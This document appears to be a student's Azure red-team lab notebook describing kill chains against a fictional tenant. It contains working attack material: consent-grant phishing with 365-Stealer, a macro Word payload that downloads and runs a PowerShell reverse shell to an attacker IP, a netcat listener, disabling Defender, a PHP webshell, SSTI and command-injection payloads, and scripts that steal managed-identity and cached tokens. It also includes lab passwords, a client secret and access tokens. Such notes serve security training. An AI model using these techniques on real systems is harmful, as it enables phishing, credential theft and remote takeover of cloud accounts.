Never ever use user Identity - use workload identities: Service Principals; Managed Identities

## Kill Chains
- Kill Chain 1
  - [Initial Access - Phishing with Illicit Consent Grant attack](https://github.com/conma293/Azure/blob/main/killcycle.md#consent-abuse)
  - [Initial Access - Insecure file upload](https://github.com/conma293/Azure/blob/main/killcycle.md#insecure-file-upload)
  - [latmove/privesc - Automation Account Runbook on Hybrid Worker](https://github.com/conma293/Azure/blob/main/killcycle.md#runbooks)
  - [latmove/privesc - RunCommand to acquire Reverse Shell on VM](https://github.com/conma293/Azure/blob/main/killcycle.md#run-command)
  - [INSTRUCTOR ONLY - ADSync and?]
- Kill Chain 2 (_Topics Covered: Authenticated Enumeration, Privilege Escalation and Data Mining_)
  - [Initial Access - Server Side Template Injection (SSTI)](https://github.com/conma293/Azure/blob/main/killcycle.md#server-side-template-injection-ssti)
  - [Gather Credentials - Keyvault](https://github.com/conma293/Azure/blob/main/killcycle.md#keyvault)
  - [Initial Access - Phish using recovered creds with evilginx](https://github.com/conma293/Azure/blob/main/2.12_Evilginx2.md)
  - [latmove/privesc - add/modify users](https://github.com/conma293/Azure/blob/main/killcycle.md#phish-and-use-roys-creds)
- Kill Chain 3 (_Topics covered - Authenticated Enumeration, Privilege Escalation and Data Mining_)
  - [Initial Access - Insecure File upload and OS Command Injection](https://github.com/conma293/Azure/blob/main/killcycle.md#command-injection)
  - [Ent App - ARM Templates Deployment History](https://github.com/conma293/Azure/blob/main/killcycle.md#enterprise-applications)
  - 
- Kill Chain 4 (_Topics covered - Authenticated Enumeration, Privilege Escalation and Data Mining_)
  - [Insecure Storage Blob](https://github.com/conma293/Azure/blob/main/killcycle.md#storage-blob)
  - [Function App - Continuous Development CD/DC leveraging github](https://github.com/conma293/Azure/blob/main/killcycle.md#function-apps)


**REFS:**

- [Enum](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md)
- [Tokens](https://github.com/conma293/Azure/blob/main/1.35_Tokens.md)

* * * 
## TOC
_Got creds for a test user by password spray or granted a contractor role through creds purchased on dark web._

Enumeration 
- Manual Enumeration
  - [Users and Groups with AzureAD](https://github.com/conma293/Azure/blob/main/killcycle.md#azuread)
  - [Resources and vms, apps with Az Powershell](https://github.com/conma293/Azure/blob/main/killcycle.md#az-powershell)
- [Stealing Tokens](https://github.com/conma293/Azure/blob/main/killcycle.md#tokens)
- [Enum tools](https://github.com/conma293/Azure/blob/main/killcycle.md#tools)

Initial Access
- [Consent Abuse - phish link to malicious app for consent grab](https://github.com/conma293/Azure/blob/main/killcycle.md#consent-abuse)
- App Services
  - [Insecure File Upload](https://github.com/conma293/Azure/blob/main/killcycle.md#insecure-file-upload)
  - [Server Side Template Injection (SSTI)](https://github.com/conma293/Azure/blob/main/killcycle.md#server-side-template-injection-ssti)
  - [OS Command Injection](https://github.com/conma293/Azure/blob/main/killcycle.md#command-injection)
- [Storage Blobs](https://github.com/conma293/Azure/blob/main/killcycle.md#storage-blob)

Privilege Escalation and Lateral Movement
- [Runbooks - latmove and privesc](https://github.com/conma293/Azure/blob/main/killcycle.md#runbooks)
  - [Az CLI Recon](https://github.com/conma293/Azure/blob/main/killcycle.md#az-cli-recon)
  - [Steal tokens from Az CLI for latmove](https://github.com/conma293/Azure/blob/main/killcycle.md#steal-tokens-for-student-vm)
  - [Add user to group in stolen session so we can enum resources](https://github.com/conma293/Azure/blob/main/killcycle.md#adding-to-group)
  - [enum Role Assignments (automation groups)](https://github.com/conma293/Azure/blob/main/killcycle.md#enumerate-resources-ie-role-assignments-for-automation-account)
  - [Create runbook](https://github.com/conma293/Azure/blob/main/killcycle.md#create-runbook)
- [RunCommand](https://github.com/conma293/Azure/blob/main/killcycle.md#run-command)
  - [Add user to VM](https://github.com/conma293/Azure/blob/main/killcycle.md#run-a-script)
  - [Get public IP](https://github.com/conma293/Azure/blob/main/killcycle.md#get-public-ip-of-vm)
  - [Connect to VM](
- [KeyVault](https://github.com/conma293/Azure/blob/main/killcycle.md#keyvault)
  - [keyvault](https://github.com/conma293/Azure/blob/main/killcycle.md#keyvault-1)
  - [enum with new user creds](https://github.com/conma293/Azure/blob/main/killcycle.md#new-user-enumeration)
  - [Administrative Units](https://github.com/conma293/Azure/blob/main/killcycle.md#administrative-units)
  - [Phish and Add Users](https://github.com/conma293/Azure/blob/main/killcycle.md#phish-and-use-roys-creds)
- [Enterprise App]
  - [Enumerate service principal type]
  - [Use Managed Identity of function app Client Secret]
  - [Deployment Template - creds]
- [FunctionApp](https://github.com/conma293/Azure/blob/main/killcycle.md#function-apps)
  - Github and Authenticator

Lateral Movemement
- VM User Data
- Script Extension
- Primary Refresh Token

* * *
# Enumeration 
TLDR:
- Use [AzureAD](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azuread-module)/[MG Module](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---mg-module) for basic AAD/Entra ID Directory enumeration (i.e., users, groups, devices)
  - This will require an access token for AAD or MS Graph
- Use [az powershell](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration----az-powershell) or [az cli](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azure-cli-az-cli) for other enumeration - resources, roles, vms, apps etc
  - This will require ARM access token (default token)
  - What we REALLY WANT is a **Managed Identity Access Token**
    

- Using tools like ROADTools or [Azurehound](https://github.com/conma293/Azure/blob/main/OAuth.md#enumeration---azurehound) is going to be our best bet anyhow (and enum isnt logged so who cares right!?)
 
    
* * *

#### AzureAD
Using the [AzureAD Module](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azuread-module) to begin


We have compromised a user "Test", so first thing after [logging in](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azuread-module); lets see what **user permissions** we have - in Azure this will be groups and roles:
```
Get-AzureADUser -SearchString 'test'
Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com
```
- Can we see much more information about this **group**? ```Get-AzureADGroup -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 | fl *```
- **Who** else is in this **group**?:  ```Get-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7```

- Ok lets look for **admin users**:
```
Get-AzureADUser -SearchString 'admin' | Get-AzureADUserMembership
Get-AzureADUserMembership -ObjectId admin@defcorphq.onmicrosoft.com
```
- I wonder who else is in the Global Admins group? ```Get-AzureADGroupMember -ObjectId 9240b75e-823c-4c02-8868-a00ddbeb3fa1```

_in normal environments we would expect to see some Service Principals (that is an application service account) running as Global Administrator - if we were to compromise that object, or a user that is the owner of that object, we could get GA!_

- Lets check if we are the **owner of a device** (and therefore localadmin)? ```Get-AzureADUserOwnedDevice -ObjectId test@defcorphq.onmicrosoft.com```
- lets see what **devices** are ACTUALLY being **used** (i.e., active): ```Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}```
- OK now lets see if there are any **custom roles**? ```Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False}``` (May need to use [preview module](https://github.com/conma293/Azure/blob/main/killcycle.md#azure-ad-graph-preview-module))
- And lets see the **users who have Global admin** role: ```Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember```
#### MG Module
You could also use the [MG Module](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---mg-module) instead if you wanted:
```
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force 
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd) 
Connect-AzAccount -Credential $creds 

$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
```
```
Get-MgUser -All
Get-MgUser -All | select UserPrincipalName
Get-MgGroup -All
Get-MgDevice
```

To get all the Global Administrators:
```
$RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
(Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties
```

list all custom directory roles:
```Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | select DisplayName```

#### az powershell
there is also [az Powershell](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration----az-powershell), best for resources, roles and VMs:

- Ok now lets enumerate all **resources** visible to the current user:
```Get-AzResource```

- And enumerate all **Azure RBAC role assignments** for all the resources the current user has read access to (NOT just the users role assignments):
```Get-AzRoleAssignment```

- lets output that to a table for ease of use:
```
Get-AzRoleAssignment | select DisplayName, RoleDefinitionName, ObjectType, CanDelegate
```

- Ok now lets look at **Virtual Machines** the user has access to: ```Get-AzVM | fl *```
- And any **Apps**: ```Get-AzWebApp```
  - We could display just **WebApp/Traditional App**:
```Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}```
  - Display **functional App**:
```Get-AzFunctionApp```
- List a table of all visible apps:
```
Get-AzWebApp | select name, HostNames, kind, state, identity
```
- Also **Storage**:
```Get-AzStorageAccount | fl```
- And **KeyVault**:
 ```Get-AzKeyVault```

#### az cli
And finally [az cli](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azure-cli-az-cli); 
a good one to use from az cli is the **whoami** equivalent:-
```az ad signed-in-user show```


Also good to note, there is more information returned from ```az cli``` for some objects i.e., Can see the type of managed identity used for objects such as VM and Webapps:
```
az vm list
az vm list --query "[].[name]" -o table

az webapp list
az webapp list --query "[].[name]" -o table

az functionapp list --query "[].[name]" -o table

az storage account list

az keyvault list
```

Important to try all tools to get info!

## Tokens
- Steal tokens (If you are signed in you can dump it with ```(Get-AzAccessToken).token```)
- reuse instead of creds (similar to TGT ticket reuse with Rubeus):
```
Connect-AzAccount -AccessToken $token -AccountId test@defcorphq.onmicrosoft.com
```

- Test access to resources: ```Get-AzResource```

_with token replay you evade conditional access policy, and almost always mfa and entra id protect as well_
  - (because its not a sign-in!) all those work only for signin, this is after, direct to api - 
```Web API Validates access token and returns secure data to web server app```

lets get graph token:
```
Get-AzAccessToken -ResourceTypeName MSGraph
disConnect-AzAccount
Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken $token -MicrosoftGraphAccessToken eyJ0eXA...
```

**best target is managed identity access token - not protected by CAE!**


### Steal token
When on a machine look in - ```C:\Users\[username]\.Azure```
 - **az cli** (before 2.30.0 – January 2022) stores access tokens in clear text in ```accessTokens.json```
    - You can modify accessTokens.json to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
    - ```azureProfile.json``` in the same directory contains information about subscriptions.
 -  **Az PowerShell** (older versions) stores access tokens in clear text in ```TokenCache.dat```
    -  It also stores ServicePrincipalSecret in clear-text in AzureRmContext.json if a service principal secret is used to authenticate.
 -  Another interesting method is to take a **process dump of PowerShell** and looking for tokens in it!
    -  Users can save tokens using Save-AzContext, look out for them! Search for **Save-AzContext** in PowerShell console history!
    -  ```C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_History.txt```
  




## Tools
#### ROADTools
```
cd C:\AzAD\Tools\ROADTools
.\venv\Scripts\activate
roadrecon auth -u test@defcorphq.onmicrosoft.com -p V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd
roadrecon gather
roadrecon gui
```


```roadrecon plugin policies``` writes to ```C:\AzAD\Tools\ROADTools```

#### AzureHound
```
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd)

Connect-AzAccount -Credential $creds

Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds

. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose
```

Run ```C:\AzAD\Tools\BloodHound-win32-x64\BloodHound-win32-x64```

matches :
```MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname```

## Consent Abuse
1. register a tenant (dont need credit card)
2. register app in newly created tenant
3. we set consent permissions we want to steal
4. we send a phishing link (ms online link)
5. User clicks on phish, grants consent
6. Users access token to graph API sent to attacker controlled app 
7. Now we can use that access token to access graph API as the phished user (limited to the permissions the user consented to)

NOTE - logs for application consent include permissions - VERBOSE LOG 
* * *

- First lets check if users can even consent

#### Azure AD Graph PREVIEW MODULE:
```
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
$passwd= ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force
$creds= New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
_**ManagePermissionGrantsForSelf.microsoft-user-default-legacy**_ means we can!

OR MS Graph:
```
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force 
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd) 
Connect-AzAccount -Credential $creds
$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
(Get-MgPolicyAuthorizationPolicy).DefaultUserRolePermissions.PermissionGrantPoliciesAssigned
```

#### Tricky way to get phishing redirect url template
- OK users can consent, lets prepare a phishing link:
goto ```https://localhost/``` and click readmore - take url from address bar which is a good redirect template:
```
https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=c0e39a5f-266c-4425-b6cf-d55350b868dc&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F171.36.152.213%2Flogin%2Fauthorized&response_mode=query&sso_reload=true
```

#### find vulnerable way to send the phish
- We can use Microburst to look for subdomains, if we find something usable like a form upload we can exploit the fact that noone cares about group email OPSEC:
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1 
Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
```
Ok now we are ready to set the trap!

* * *

#### Step 1 - make the app

- goto portal.azure.com

  - signin as student213@defcorpextcontractors.onmicrosoft.com

- Click Microsoft Entra ID > Manage > App registrations - New registrations
  - Create an app called Student213_App
  - Accounts in Multitenant
  - Redirect URI (Web) to our attacker VM - https://171.36.151.213/login/authorized
  - goto certificates and secrets and create a Client Secret - a client secret allows you to access the tenant as an application
  - **SAVE CLIENT SECRET!!!**: 
```
_Qb8Q~yaLVJW5Y1li3dtzyES8j1fQp7j43xfjctR
```
  - now API Permissions - ```User.Read``` is already there, lets add some other good ones:
    - MS Graph> Delegated permissions> ```User.ReadBasic.All```
    - (have to have admin to be able to consent for Application permissions)

#### Step 2 - ready the handler/listener
We need to ready the attacker VM for incoming redirects that we are going to phish out

- Run xampp to launch webserver
- Copy the '365-Stealer' directory from C:\AzAD\Tools directory to C:\xampp\htdocs
- navigate to:- http://localhost:82/365-stealer/yourVictims
- click on 365 stealer configuration 
  - need to provide the app ID and client secret (from before in the azure portal blade)
  - and:
```
https://171.36.152.213/login/authorized
/
[blank]
[blank]
1
```
- save config
- run 365 stealer
- this has now provided us with the phishing URL we need for later:
```
https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=9e10a3bc-7cfa-407c-8ec9-8b04a3f2cd45&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F171.36.151.213%2Flogin%2Fauthorized&response_mode=query
```


#### Step 3 - Send the phish
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1 
Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
```
/.default - whatever is specified in permissions consent
query mode so its easier for us to pass the output

- navigate to contact form to upload phish 
- ```defcorphqcareer.azurewebsites.net```
- need help section
- put phishing link in the reference link field
- shared/group mailboxes are a mess, no one has sole resposibility - exploit it 


#### Step 4 - Pass the token

Now with the token in hand we can pass to the API
```
$Token = 'eyJ0eX..'

$URI = 'https://graph.microsoft.com/v1.0/users'

$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}

(Invoke-RestMethod @RequestParams).value
```


#### Step 5 - PrivEsc - now we want Admin Consent

From the returned users we have identified an admin - if we can phish an admin we can get an admin consent

- add more delegated permissions to the app
  - ```mail.read```, ```notes.read.all```, ```mailboxsettings.readwrite```, ```files.readwrite.all```, ```mail.send```
- email markdwalden@defcorphq.onmicrosoft.com 
- look at token in https://jwt.io
- using the 365Stealer webapp GUI (and the consented permissions) we can upload a file to their onedrive
- create macro infected wordfile with a revshell back to attackers machine
```
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)
$officeVM = New-PSSession -ComputerName 171.36.1.250 -Credential $creds 

Enter-PSSession -Session $officeVM 
```

- Now in the remote session:
```Set-MpPreference -DisableRealtimeMonitoring $true```

- Now, host the script Out-Word on your student VM by copying it to the C:\xampp\htdocs directory and use the below command in the PSRemoting session to load it on the office VM:
```
iex (New-Object Net.Webclient).downloadstring("http://171.36.152.213:82/Out-Word.ps1")
```

- create the word doc:
```
Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://171.36.152.213:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 171.36.152.213 -Port 4444" -OutputFile studentx.doc
```

- copy it back to your machine:
```
Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc -Destination C:\AzAD\Tools\studentx.doc
```

Now, start a listener on your student VM to catch the reverse shell: 
```
C:\AzAD\Tools\netcat-win32-1.12\nc64.exe -lvp 4444 
```

- Before you upload the malicious ```.doc``` make sure you have hosted ```Invoke-PowerShellTcp.ps1``` in ```C:\xampp\htdocs```!!!

## App Services
### Insecure File Upload
We find a vulnerable form to upload files into, now lets upload hilarious shell:-
```
<?php 
system($_REQUEST['cmd']);
?>
```
Now we can navigate to:
```
https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
```
- If the app service contains environment variables IDENTITY_HEADER and IDENTITY_ENDPOINT, it has a **managed identity**.
- Copy this output down - IDENTITY_HEADER is the clientID we will need later
- and then we can request an ARM toke by passing the IDENTITY_HEADER using curl in php webshell:
```
<?php 
system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>
```

Now we can navigate to:
```
https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml
```

and we will be returned an access token for the managed identity of the webapp:
```
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1HTHFqOThWTkxvWGFGZnBKQ0JwZ0I0SmFLcyIsImtpZCI6Ik1HTHFqOThWTkxvWGFGZnBKQ0JwZ0I0SmFLcyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE3MjAwNzY5MzYsIm5iZiI6MTcyMDA3NjkzNiwiZXhwIjoxNzIwMTYzNjM2LCJhaW8iOiJFMmRnWUdnVXZidmo3NXh1b2NJN000TnUrSHRQQlFBPSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRrWklmM2tBdXRkUHVrUGF3ZmoyTUJQRUFBQS4iLCJzdWIiOiJjYzY3YzkwZC1kOWU5LTQwZDItYjUxMS05ZDUyZDY3NjgyYWIiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJQSGcwMTBIRTAwV3pUSjNpVmdFZEFBIiwidmVyIjoiMS4wIiwieG1zX2lkcmVsIjoiOCA3IiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0VuZ2luZWVyaW5nL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL2RlZmNvcnBocWNhcmVlciIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.bRYpVA53dHWyHxcvjClNByYFR_Q-5iEBdvq6UNOHVD9k8o8YBMktGmo0eY1Jzo_vfUBwQuzD1u9UvJiC_I13uW3a3Hb6GmIFvUXZoAVp0cLcutSEujvowoQIjUZDzM6dAYWOuy1oHjhBcAIOw2kCAhHqcl_RXfSw9eDXLTdOlds_OADvTPpcXUzX4F87zsXTjJrXlpttmGadW_laknfDcnjVZsgWUZB9dpchzGf71c5u3NNf_Xn7lO2zC7DeyR5xBijSPpjFOdOyBAmiLVkR0e-YzyHBwzJxEiRbnqX3HrumUwZvpyUijySsDkUPqkRXpiWY6XKp4Oh1eLzc02qCXg","expires_on":"07/05/2024 07:13:55 +00:00","resource":"https://management.azure.com/","token_type":"Bearer","client_id":"064aaf57-30af-41f0-840a-0e21ed149946"}
```

what resources do we have access to (IDENTITY_HEADER is the clientID):
```
Connect-AzAccount -AccessToken $token -AccountId <clientID>
Get-AzResource
```

Let's use the token with Azure REST API.
We would need the subscription ID, use the code below to request it:
```
$Token = 'eyJ0eX..'
```

```
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
RESPONSE:
_id                   : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768
authorizationSource  : RoleBased
..._


Now we can list all resources accessible for the managed identity assigned to the app service, just by using the returned subscriptionID + ``/resources`` 
- Note that the only difference is the URI after ```https://management.azure.com``` to include ```/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources```:
```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'
```
Let's see what actions are allowed using the below code:
```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
```

THIS GIVES US ```{Microsoft.Compute/virtualMachines/runCommand/action}```

### Server Side Template Injection (SSTI)

- If we know the app is running a template, we can do OS injection. 
```
{{config.items()}}
```

- We know this app is running flask (from }config.items()} injection)
  - Therefore we can just use the ```popen``` call from the ```os``` module: 
```
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
```
ENV will give us the Identity Header which is the ClientID and the Identity Endpoint - copy these down to notepad as per usual

Now Let's request the access token for the managed identity now using the following code:
```
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

Use this token with Az PowerShell to find all accessible resources: 
```
$token = 'eyJ0e..'
Connect-AzAccount -AccessToken $token -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc
Get-AzResource
```

### Command Injection
a lot of the time the EndOfLine or Special Character is a ```;``` - so just put a semi-colon and a system call after it to test!
- This website says when we upload files it goes to the ```/tmp``` folder for scanning.. we can upload our python script to extract the tokens and run it from the vulnerable form:
```
; ls /tmp;
; ls /tmp/uploads/studentx;
; python /tmp/uploads/studentx/studentx.py;
```

The python script contains the same ```curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com``` with ```popen``` command we have performed previously:
```
import os
import json

IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()

print("[+] Management API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()
print("\r\n[+] Graph API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])
```

we are returned:
```
Status: [+] Management API
Access Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1HTHFqOThWTkxvWGFGZnBKQ0JwZ0I0SmFLcyIsImtpZCI6Ik1HTHFqOThWTkxvWGFGZnBKQ0JwZ0I0SmFLcyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE3MjA0OTAwODMsIm5iZiI6MTcyMDQ5MDA4MywiZXhwIjoxNzIwNTc2NzgzLCJhaW8iOiJFMmRnWURpblZ6U3pPajUvNlpIc3ZjbXZQcDR4QWdBPSIsImFwcGlkIjoiNjJlNDQ0MjYtNWM0Ni00ZTNjLThhODktZjQ2MWQ1ZDU4NmYyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRrWklmM2tBdXRkUHVrUGF3ZmoyTUJQRUFBQS4iLCJzdWIiOiJlYTRjM2MxNy04YTVkLTRlMWYtOTU3Ny1iMjlkZmZmMDczMGMiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJPMmJuWHVsZFZrcURiUmhmMmFWNkFBIiwidmVyIjoiMS4wIiwieG1zX2lkcmVsIjoiMjIgNyIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9JVC9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9wcm9jZXNzZmlsZSIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.MkVhWxJwxy8nfrIf7oX4xfSgtbpvp76YlJgZnNdIstAVAnbWH7uP4L4OmsrhflJCyBVh8cVFu_NAQ9sLj8yjZ34rfPl3NxLyU1MILm8qELbZT67XEIu3iw5YgrtTDL4eUcV-rt8R8RoVDGQArLfB6CCdk2NkRlMoErU-zuaDyihxwOW2ZQMkZYgqr3eTXh2JfEoWSYJo1_6U9OaYqFcu62XEblZXIKSKC4WVS2PTmg18tAQ9NoXH5-SvWTAi0dWYKcK4bGEORhakI8MEDXpxdz7kudtmN_aEDenUlnF_K4XMXVag8Wbvf5MIgjInMhAGeXc18dXtCr6McM7jDcixmQ
ClientID: 62e44426-5c46-4e3c-8a89-f461d5d586f2

[+] Graph API
